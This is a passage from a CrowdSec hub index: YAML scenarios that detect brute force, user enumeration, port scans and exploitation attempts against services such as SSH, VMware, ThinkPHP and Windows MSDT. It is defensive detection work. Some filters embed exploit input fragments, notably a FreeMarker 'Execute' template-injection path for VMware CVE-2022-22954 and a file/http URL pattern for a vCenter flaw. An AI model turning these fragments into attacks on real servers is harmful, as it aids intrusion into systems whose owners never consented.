user-enum\ntype: leaky\nname: crowdsecurity/ssh-slow-bf_user-enum\ndescription: \"Detect slow ssh user enum bruteforce\"\nfilter: evt.Meta.log_type == 'ssh_failed-auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 60s\ncapacity: 10\nblackhole: 1m\nlabels:\n  service: ssh\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ssh:bruteforce\"\n  label: \"SSH Slow User Enumeration\"\n", "description": "Detect slow ssh bruteforce", "path": "scenarios/crowdsecurity/ssh-slow-bf.yaml", "references": ["http://wikipedia.com/ssh-bf-is-bad"], "version": "0.4", "versions": {"0.1": {"digest": "1b910bf7af59dab8dfbba8a735aafb3e4871d1237b29d56f53d7c0eece0381cf"}, "0.2": {"digest": "48665e6f7f4f0af7a47c7e81b0550c86f111e79c0a80d90290e560846beb4008"}, "0.3": {"digest": "313b1dc11a05f8beb6718cdeefe79866122eca26394efe2b814d5d2e15c28f4d"}, "0.4": {"digest": "892f9a153c4dafb5392ba40d70616e88896571be8f4cc00996e7f5e8277c869e"}}}, "crowdsecurity/stirling-pdf-bf": {"content": "# stirling pdf bruteforce\ntype: leaky\nname: crowdsecurity/stirling-pdf-bf\ndescription: \"Detect stirling pdf bruteforce\"\nfilter: \"evt.Meta.service == 'stirling-pdf' && evt.Meta.log_type == 'failed_authentication'\"\nleakspeed: \"10s\"\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: stirling-pdf\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Stirling PDF Bruteforce\"\n  behavior: \"generic:bruteforce\"\n  remediation: true\n", "description": "Detect stirling pdf bruteforce", "path": "scenarios/crowdsecurity/stirling-pdf-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "18bd06a7ba000717fdd3985954ab09b6191388d98bc6b977eae778c702c1fefb"}}}, "crowdsecurity/suricata-alerts": {"content": "# for max (1) priority : kill on sight\ntype: trigger\nname: crowdsecurity/suricata-major-severity\ndescription: \"Detect exploit attempts via emerging threat rules\"\nfilter: \"evt.Meta.log_type == 'suricata_alert' && evt.Parsed.proto == 'TCP' && evt.Meta.suricata_rule_severity == '1'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: suricata\n  remediation: true\n  confidence: 1\n  spoofable: 3\n  classification:\n    - attack.T1190\n    - attack.T1595\n  behavior: \"generic:exploit\"\n  label: \"Suricata Severity 1 Event\"\n\n---\n# for lower (2) priority : wait for >=3 different signatures being triggered\n# we intentionally avoid scenarios on priority 3 and such that are too sensitive to false positives\ntype: leaky\ncapacity: 2\nleakspeed: 20s\ndistinct: evt.Meta.suricata_alert_signature_id\nname: crowdsecurity/suricata-high-medium-severity\ndescription: \"Detect exploit attempts via emerging threat rules\"\nfilter: \"evt.Meta.log_type == 'suricata_alert' && evt.Parsed.proto == 'TCP' && evt.Meta.suricata_rule_severity == '2'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: suricata\n  confidence: 1\n  spoofable: 3\n  classification:\n    - attack.T1190\n    - attack.T1595\n  behavior: \"generic:exploit\"\n  label: \"Suricata Severity 2 Event\"\n", "description": "Detect exploit attempts via emerging threat rules", "path": "scenarios/crowdsecurity/suricata-alerts.yaml", "version": "0.5", "versions": {"0.1": {"digest": "dca94f89e6df928e3d8924f9e1a012bf9c20bb9f8370c6e2c588d93da4e02e27"}, "0.2": {"digest": "5ac0f4c98c5b01ac2114ecc41a27be942201f687ad242b00e73c571ef6ac98d3"}, "0.3": {"digest": "ccef8952af2cb7931773dfee72eb8f7f65c476b7c5d4c8b5bfd3553b301992ac"}, "0.4": {"digest": "f91dbdceb8b96904b6b87c9d23544df6021b5bb72b43b93a754afbf6bc19c89b"}, "0.5": {"digest": "f28e65d17a4ea8f145941aefc33ceed0fe06a93c3fcc9a22bf9450d092383baf"}}}, "crowdsecurity/synology-dsm-bf": {"content": "# Synology DSM auth.log bruteforce\ntype: leaky\nname: crowdsecurity/synology-dsm-bf\ndescription: \"Detect Synology DSM web auth bruteforce\"\nfilter: \"evt.Meta.log_type == 'synology-dsm_failed_auth'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n service: synology_dsm\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n  - attack.T1110\n behavior: \"http:bruteforce\"\n label: \"Synology DSM Bruteforce\"", "description": "Detect Synology DSM web auth bruteforce", "path": "scenarios/crowdsecurity/synology-dsm-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "8d70f3ab754d69ce9c10fb668bf3fb6bf9f02dca26e577c6c8b0c10731b0c442"}, "0.2": {"digest": "8e89ba870ba373ddc4bc2f745cb08dcf6666035a17bfa5043906158c160f93af"}}}, "crowdsecurity/teamspeak3-bf": {"content": "type: leaky\nname: crowdsecurity/teamspeak3-bf\ndescription: \"detect teamspeak3 server bruteforce\"\nfilter: evt.Meta.log_type == 'ts3_fail_auth'\ngroupby: evt.Meta.source_ip\ncapacity: 2\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  service: teamspeak3\n  type: bruteforce\n  classification:\n    - attack.T1110\n  behavior: \"generic:bruteforce\"\n  spoofable: 0\n  confidence: 2\n  label: \"TeamSpeak3 Bruteforce\"\n  remediation: true\n", "description": "detect teamspeak3 server bruteforce", "path": "scenarios/crowdsecurity/teamspeak3-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6a6f6a1c73fed4a1ccb9745e42614bc693b975f2eabb31b7c9ac2ede9568b166"}, "0.2": {"digest": "fe7bc25db10780c851f053e8b388b734a7c8d929412b730d3256ab700f56368d"}}}, "crowdsecurity/teleport-bf": {"content": "type: leaky\nname: crowdsecurity/teleport-bf\ndescription: \"detect teleport bruteforce\"\nfilter: | \n  evt.Meta.service == 'teleport' &&\n  evt.Meta.sub_type in ['auth', 'user.login'] &&\n  evt.Meta.success == 'false'\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n service: teleport\n type: bruteforce\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n    - attack.T1110\n label: \"Teleport Bruteforce\"\n behavior: \"teleport:bruteforce\"\n---\ntype: leaky\nname: crowdsecurity/teleport-slow-bf\ndescription: \"detect slow teleport bruteforce\"\nfilter: | \n  evt.Meta.service == 'teleport' &&\n  evt.Meta.sub_type in ['auth', 'user.login'] &&\n  evt.Meta.success == 'false'\ngroupby: evt.Meta.source_ip\ncapacity: 10\nleakspeed: 1m\nblackhole: 5m\nlabels:\n service: teleport\n type: bruteforce\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n    - attack.T1110\n label: \"Teleport Bruteforce\"\n behavior: \"teleport:bruteforce\"", "description": "detect teleport bruteforce", "path": "scenarios/crowdsecurity/teleport-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "cfc359efcdedb98f82d200cea373d98de3ba94993b6cbd0f784df53134d0b428"}}}, "crowdsecurity/telnet-bf": {"content": "type: leaky\nname: crowdsecurity/telnet-bf\ndescription: \"detect telnet bruteforce\"\nfilter: evt.Meta.log_type == 'telnet_new_session'\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  service: telnet\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"telnet:bruteforce\"\n  label: \"Telnet Bruteforce\"\n  remediation: true\n", "description": "detect telnet bruteforce", "path": "scenarios/crowdsecurity/telnet-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "fd1769c247b352916a0400c33668b315a6d7a0ab8e672f339b00d9de2df71229"}, "0.2": {"digest": "3e21b4bdaba0abd031f17f4ee8c0e661695e463681892b71ff6333b92673c4a1"}}}, "crowdsecurity/thehive-bf": {"content": "type: leaky\ndebug: false\nname: crowdsecurity/thehive-bf\ndescription: \"Detect bruteforce on Thehive web interface\"\nfilter: evt.Meta.log_type == 'thehive_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"The Hive Bruteforce\"\n  remediation: true\n", "description": "Detect bruteforce on Thehive web interface", "path": "scenarios/crowdsecurity/thehive-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "6a8e5ab92bdc2087dffb2702d9990a7c974654ce88db63a3b7f4a40b3af75790"}, "0.2": {"digest": "a082bd5622ebf06280de10cdd126699b8d53f8ca002085e4113d3ea174597e9a"}, "0.3": {"digest": "ef76556198a2c9c72636092cfac1ca8a604f905a372e923fa57fcc467e5e66fe"}}}, "crowdsecurity/thinkphp-cve-2018-20062": {"content": "type: trigger\nformat: 2.0\n#debug: true\nname: crowdsecurity/thinkphp-cve-2018-20062\ndescription: \"Detect ThinkPHP CVE-2018-20062 exploitation attemps\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and RegexpInFile(Lower(evt.Meta.http_path), \"thinkphp_cve_2018-20062.txt\")\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/thinkphp_cve_2018-20062.txt\n    dest_file: thinkphp_cve_2018-20062.txt\n    type: regexp\n    strategy: LRU\n    size: 20\n    ttl: 10s\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2018-20062\n  behavior: \"http:exploit\"\n  label: \"ThinkPHP CVE-2018-20062\"\n  remediation: true\n  service: thinkphp\n", "description": "Detect ThinkPHP CVE-2018-20062 exploitation attemps", "path": "scenarios/crowdsecurity/thinkphp-cve-2018-20062.yaml", "version": "0.6", "versions": {"0.1": {"digest": "bf76bbd0e78be17642a4ea0d8c080ae72b43075fa74ba77990aac602285c1857"}, "0.2": {"digest": "abb7a26fc4cd630c545738b3cf43d36439526eec9c5a25668f434c1cf9f0320b"}, "0.3": {"digest": "1cc85df2f1e642e83ec20e0197777795b82ff076842c6b169a8a7b1e4687de3a"}, "0.4": {"digest": "a7d01cde79e669479f49160d5c122898ee88e14ac07d27d232b9b14ac839d5d5"}, "0.5": {"digest": "e91ada2fdadd6e70b1feceb4977e4830fdcc811e0ace9cf3f6055cacc5943e8d"}, "0.6": {"digest": "3a3596ed6734fc879a1d93c5b9e9b69906140fc68223578d72d31f07c2e1640f"}}}, "crowdsecurity/vmware-cve-2022-22954": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/vmware-cve-2022-22954\ndescription: \"Detect Vmware CVE-2022-22954 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && Upper(QueryUnescape(evt.Meta.http_path)) startsWith Upper('/catalog-portal/ui/oauth/verify?error=&deviceUdid=${\"freemarker.template.utility.Execute\"?new()(')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2022-22954\n  behavior: \"vm-management:exploit\"\n  label: \"VMWARE CVE-2022-22954\"\n  remediation: true\n  service: vmware\n", "description": "Detect Vmware CVE-2022-22954 exploitation attempts", "path": "scenarios/crowdsecurity/vmware-cve-2022-22954.yaml", "version": "0.3", "versions": {"0.1": {"digest": "a5d994d73edec1ea334d09cd057193163a32527797f9556774f167bda1593616"}, "0.2": {"digest": "d26a37b84b843dba6a0266d54f754438b875fa8bc62de6ddd7d9d2d5d1eba07c"}, "0.3": {"digest": "4970a46baaef676bd66166bbeedd764df53cc0b81f6a15812e5b231953b6314a"}}}, "crowdsecurity/vmware-vcenter-vmsa-2021-0027": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/vmware-vcenter-vmsa-2021-0027\ndescription: \"Detect VMSA-2021-0027 exploitation attemps\"\nfilter: |\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && evt.Meta.http_path matches '/ui/vcav-bootstrap/rest/vcav-providers/provider-logo\\\\?url=(file|http)'\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2021-0027\n  behavior: \"vm-management:exploit\"\n  label: \"VMWARE VCenter VMSA CVE-2021-0027\"\n  remediation: true\n  service: vmware\n", "description": "Detect VMSA-2021-0027 exploitation attemps", "path": "scenarios/crowdsecurity/vmware-vcenter-vmsa-2021-0027.yaml", "version": "0.2", "versions": {"0.1": {"digest": "4d497542fa056c82b0089b7849ce686544b8ae9775f6dffddd6ac5074ec5964b"}, "0.2": {"digest": "f4d75dc60a53e0a98cf3af39207c52de14a7aeb4571eb15234e881aea5793064"}}}, "crowdsecurity/vsftpd-bf": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/vsftpd-bf\ndescription: \"Detect FTP bruteforce (vsftpd)\"\nfilter: evt.Meta.log_type == 'ftp_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ftp:bruteforce\"\n  label: \"VSFTPD Bruteforce\"\n  remediation: true\n  service: vsftpd\n", "description": "Detect FTP bruteforce (vsftpd)", "path": "scenarios/crowdsecurity/vsftpd-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "3591247988014705cf3a7e42388f0c87f9b86d3141268d996c5820ceab6364e1"}, "0.2": {"digest": "d1ddf4797250c1899a93ce634e6366e5deaaaf7508135056d17e9b09998ddf91"}}}, "crowdsecurity/windows-CVE-2022-30190-msdt": {"content": "type: trigger\nname: crowdsecurity/CVE-2022-30190-msdt\ndescription: \"Detect CVE-2022-30190 from sysmon events\"\nfilter: |\n  evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1' && \n  Upper(evt.Parsed.Image) endsWith 'MSDT.EXE' && \n  Upper(evt.Parsed.ParentImage) endsWith 'WINWORD.EXE' &&\n  (Upper(evt.Parsed.CommandLine) contains 'PCWDIAGNOSTIC' && Upper(evt.Parsed.CommandLine) contains 'IT_REBROWSEFORFILE' && Upper(evt.Parsed.CommandLine) contains 'IT_BROWSEFORFILE')\nlabels:\n  type: rce\n  notification: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1059\n    - attack.T1203\n    - cve.CVE-2022-30190\n  behaviors: \"windows:rce\"\n  label: \"CVE-2022-30190\"\n  service: windows\nscope:\n  type: user_account\n  expression: evt.Parsed.User\n", "description": "Detect CVE-2022-30190 from sysmon events", "path": "scenarios/crowdsecurity/windows-CVE-2022-30190-msdt.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6cac369ca1553245cf9a837275492822387a43a0a4f138560dfdda208def1103"}, "0.2": {"digest": "2e41d1c94e7af7e2cdb8eb0c22152a44f320b9e7ef00b6604b3f77977e86f3ed"}}}, "crowdsecurity/windows-bf": {"content": "# windows auth bruteforce\ntype: leaky\nname: crowdsecurity/windows-bf\ndescription: \"Detect windows auth bruteforce\"\nfilter: \"evt.Meta.log_type == 'windows_failed_auth'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"windows:bruteforce\"\n  label: \"Windows Bruteforce\"\n  remediation: true\n  service: windows\n", "description": "Detect windows auth bruteforce", "path": "scenarios/crowdsecurity/windows-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "8bab4995597e6a72e87131cd681ed6023c90cc805c3ee824bfbce1725e67fdd8"}, "0.2": {"digest": "d90b8a59f018321a1571744836a05c7a1d1214902bede5b3122f0c66339ce155"}}}, "crowdsecurity/wireguard-auth": {"content": "type: leaky\nname: crowdsecurity/wireguard-auth\ndescription: \"Detects rejected connections attempts and unauthorized packets through wireguard tunnels\"\nfilter: \"evt.Meta.log_type == 'wireguard_failed_auth'\"\ngroupby: evt.Meta.source_ip\nleakspeed: \"30s\"\ncapacity: 3\nblackhole: 1m\nlabels:\n  remediation: true\n  service: wireguard\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Wireguard Bruteforce\"\n  behavior: \"generic:bruteforce\"\n", "description": "Detects rejected connections attempts and unauthorized packets through wireguard tunnels", "path": "scenarios/crowdsecurity/wireguard-auth.yaml", "version": "0.2", "versions": {"0.1": {"digest": "63d0813873be54c7fe419127eae9981713dadfca5e3514583d1ade1f20633d04"}, "0.2": {"digest": "e2620820c7b1b14d80075ba0613da2c75462bd10597d9236cf434eba5386ad4e"}}}, "darkclip/charon-ipsec-bf": {"content": "name: darkclip/charon-ipsec-bf\n#debug: true\ndescription: \"Detect Charon IPsec bruteforce\"\nfilter: \"evt.Meta.log_type == 'charon_ipsec_auth_fail'\"\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"10s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: charon_ipsec\n  behavior: \"generic:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Charon IPsec Bruteforce\"\n  remediation: true\n", "description": "Detect Charon IPsec bruteforce", "path": "scenarios/darkclip/charon-ipsec-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "183e51751d76663ff636d1b64acae7ade0ac6995ec50ea77a09e573f9a61079e"}}}, "darkclip/charon-ipsec-slow-bf": {"content": "name: darkclip/charon-ipsec-bf\n#debug: true\ndescription: \"Detect Charon IPsec slow bruteforce\"\nfilter: \"evt.Meta.log_type == 'charon_ipsec_auth_fail'\"\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"60s\"\ncapacity: 10\nblackhole: 1m\nlabels:\n  service: charon_ipsec\n  behavior: \"generic:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Charon IPsec Slow Bruteforce\"\n  remediation: true\n", "description": "Detect Charon IPsec slow bruteforce", "path": "scenarios/darkclip/charon-ipsec-slow-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "b91ab9160377e1a2396c593b054374c778cb6affadecdba952207fb1e9442fe0"}}}, "firewallservices/lemonldap-ng-bf": {"content": "# Lemonldap::NG brutforce\ntype: leaky\n#debug: true\nname: firewallservices/lemonldap-ng-bf\ndescription: \"Detect Lemonldap::NG bruteforce\"\nfilter: evt.Meta.service == 'llng' and evt.Meta.log_type == 'llng_auth_fail'\nleakspeed: 30s\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: ldap\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ldap:bruteforce\"\n  label: \"LemonLDAP Bruteforce\"\n  remediation: true\n\n---\n# Lemonldap::NG user enumeration\ntype: leaky\n#debug: true\nname: firewallservices/lemonldap-ng-user-enum\ndescription: \"Detect Lemonldap::NG user enum bruteforce\"\nfilter: evt.Meta.service == 'llng' and evt.Meta.log_type == 'llng_auth_fail'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 2m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: ldap\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n    - attack.T1595\n  behavior: \"ldap:bruteforce\"\n  label: \"LemonLDAP User Enum Bruteforce\"\n  remediation: true\n", "description": "Detect Lemonldap::NG bruteforce", "path": "scenarios/firewallservices/lemonldap-ng-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "92ffa388cc0c79431a9014d6a384a84e7571d5e3445ff60d29792eb5d36307da"}, "0.2": {"digest": "d27d2e0536ff663a0d5821598cf063be7c382946117116cf6335bf18258488a0"}}}, "firewallservices/pf-scan-multi_ports": {"content": "type: leaky\nname: firewallservices/pf-scan-multi_ports\ndescription: \"Detect aggressive portscans (pf)\"\nfilter: \"evt.Meta.log_type == 'pf_drop' && evt.Meta.service == 'tcp'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Parsed.dst_port\ncapacity: 15\nleakspeed: 5s\nblackhole: 1m\nlabels:\n  service: tcp\n  confidence: 1\n  spoofable: 3\n  classification:\n    - attack.T1595.001\n    - attack.T1018\n    - attack.T1046\n  behavior: \"tcp:scan\"\n  label: \"PF Scan Multi Ports\"\n  remediation: true\n", "description": "Detect aggressive portscans (pf)", "path": "scenarios/firewallservices/pf-scan-multi_ports.yaml", "version": "0.5", "versions": {"0.1": {"digest": "d650a9e64532d14a46dcf5bfc952b0a0eb1825efdb07a179069d9c7f8f185d78"}, "0.2": {"digest": "42359d53fdf4b78cf2600d81c5a893bb0306589190447cde88f5c0e788706136"}, "0.3": {"digest": "d650a9e64532d14a46dcf5bfc952b0a0eb1825efdb07a179069d9c7f8f185d78"}, "0.4": {"digest": "a8017247b648a5b731414ea6e7923b12d8da86ae0be535b96aa122ac65653b1f"}, "0.5": {"digest": "cc7db3dfe4ceb18e39de969a641e66d7f0279120695a43ad55e51dcca036a34d"}}}, "firewallservices/zimbra-bf": {"content": "# Zimbra brutforce\ntype: leaky\n#debug: true\nname: firewallservices/zimbra-bf\ndescription: \"Detect Zimbra bruteforce\"\nfilter: evt.Meta.log_type == 'zimbra_auth_fail'\nleakspeed: 30s\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: zimbra\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Zimbra Bruteforce\"\n  remediation: true\n---\n# Zimbra user enumeration\ntype: leaky\n#debug: true\nname: firewallservices/zimbra-user-enum\ndescription: \"Detect Zimbra user enum bruteforce\"\nfilter: evt.Meta.log_type == 'zimbra_auth_fail'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 2m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: zimbra\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589.002\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Zimbra Bruteforce\"\n  remediation: true\n", "description": "Detect Zimbra bruteforce", "path": "scenarios/firewallservices/zimbra-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "20cd0d65ecb94e81c785bbc8117d3cf12333bf0b32f600d14949be7ce21f3a4c"}, "0.2": {"digest": "f7c711ae8b784fb37120952db8b47815c35c917dc6be49e6818d7a97b1aea379"}}}, "firix/authentik-bf": {"content": "# Authentik BF scan\ntype: leaky\nname: firix/authentik-bf\ndescription: \"Detect authentik bruteforce\"\nfilter: evt.Meta.log_type in ['authentik_failed_auth', 'authentik_invalid_username']\ngroupby: evt.Meta.source_ip\nleakspeed: 20s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: authentik\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Authentik Bruteforce\"\n  remediation: true\n---\n# Authentik user-enum\ntype: leaky\nname: firix/authentik-bf_user-enum\ndescription: \"Detect authentik user enum bruteforce\"\nfilter: evt.Meta.log_type in ['authentik_failed_auth', 'authentik_invalid_username']\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: authentik\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Authentik User Enumeration\"\n  remediation: true \n", "description": "Detect authentik bruteforce", "path": "scenarios/firix/authentik-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f2d5cf9e9fa750c2e3372aebeaf35fe13d56b7e0089dc01a744b6687d1872f3b"}, "0.2": {"digest": "aacc48254b1bbb05eb25ba445530e7685520738ef22bfee323af0ee305598c4c"}}}, "fulljackz/proxmox-bf": {"content": "# Proxmox authent bruteforce\ntype: leaky\nname: fulljackz/proxmox-bf\ndescription: \"Detect proxmox bruteforce\"\nfilter: \"evt.Meta.log_type == 'pve_failed-auth'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\n\nlabels:\n  service: vm-management\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"vm-management:bruteforce\"\n  label: \"PveDaemon Bruteforce\"\n  remediation: true\n---\n# Proxmox bad user\ntype: leaky\nname: fulljackz/proxmox-bf-user-enum\ndescription: \"Detect proxmox wrong username\"\nfilter: \"evt.Meta.log_type == 'pve_failed-auth'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.source_user\nblackhole: 1m\nreprocess: true\nlabels:\n  service: vm-management\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"vm-management:bruteforce\"\n  label: \"PveDaemon User Enum Bruteforce\"\n  remediation: true\n", "description": "Detect proxmox bruteforce", "path": "scenarios/fulljackz/proxmox-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "0e9371bccf18fdd2195b68c9506182d0958ef4e8a31289d34106fda4b58ccd17"}, "0.2": {"digest": "b0d36f0ced0f2b05e56c0655a1730181a653796133e0770a72ea5cf71db5cb9e"}}}, "fulljackz/pureftpd-bf": {"content": "# Pureftpd authent bruteforce\ntype: leaky\nname: fulljackz/pureftpd-bf\ndescription: \"Detect pureftpd bruteforce\"\nfilter: \"evt.Meta.log_type == 'pftpd_failed-auth'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: ftp\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ftp:bruteforce\"\n  label: \"PureFTPD Bruteforce\"\n  remediation: true\n", "description": "Detect pureftpd bruteforce", "path": "scenarios/fulljackz/pureftpd-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "b3d2ff52ddeff8e7bc547565b7d797c7420f4f5dc4cd00181f4a2be28dd56be7"}, "0.2": {"digest": "36c442c20c6124c19a31fc4e57d2d65e9d1dfd63b59aebda95c3f0846ff9ed16"}}}, "gauth-fr/immich-bf": {"content": "# immich BF scan\nname: gauth-fr/immich-bf\ndescription: \"Detect immich bruteforce\"\nfilter: \"evt.Meta.log_type == 'immich_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: immich\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Immich Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n---\n# immich user-enum\ntype: leaky\nname: gauth-fr/immich-bf_user-enum\ndescription: \"Detect immich user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'immich_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: immich\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  label: \"Immich Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n", "description": "Detect immich bruteforce", "path": "scenarios/gauth-fr/immich-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ac8169ad4527ba503533131e47f7ffe26f5c49ac2ffda361217e45c77125c887"}, "0.2": {"digest": "55a427ed10a711e624975181bdf80a2050238107245f0f0cf954a8d0a91f7244"}}}, "hitech95/mail-generic-bf": {"content": "# Global brouteforce\ntype: leaky\n#debug: true\nname: hitech95/email-generic-bf\ndescription: \"Detect generic email brute force\"\nfilter: \"evt.Meta.log_type == 'mail_auth' && evt.Meta.sub_type == 'auth_fail'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  service: pop3/imap\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"POP3/IMAP Bruteforce\"\n  remediation: true\n---\n# Per user brouteforce\ntype: leaky\n#debug: true\nname: hitech95/email-user-bf\ndescription: \"Detect specific user email brute force\"\nfilter: \"evt.Meta.log_type == 'mail_auth' && evt.Meta.sub_type == 'auth_fail'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\ncapacity: 3\nleakspeed: \"30s\"\nblackhole: 1m\nlabels:\n  service: pop3/imap\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589.002\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Mail User Enum Bruteforce\"\n  remediation: true\n", "description": "Detect generic email brute force", "path": "scenarios/hitech95/mail-generic-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f4dd689cd76dbad62fc1188d106ee58d67e9637398e25f1ee6c4dd56039491c1"}, "0.2": {"digest": "6240b1295617a293ce14a9e5ccea082a0df0d55259ca01653d423eb6a290c72a"}}}, "inherent-io/keycloak-bf": {"content": "type: leaky\nname: inherent-io/keycloak-bf\ndescription: \"Detect keycloak bruteforce\"\nfilter: evt.Meta.service == \"keycloak\" && evt.Meta.error in ['user_not_found', 'invalid_user_credentials']\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: 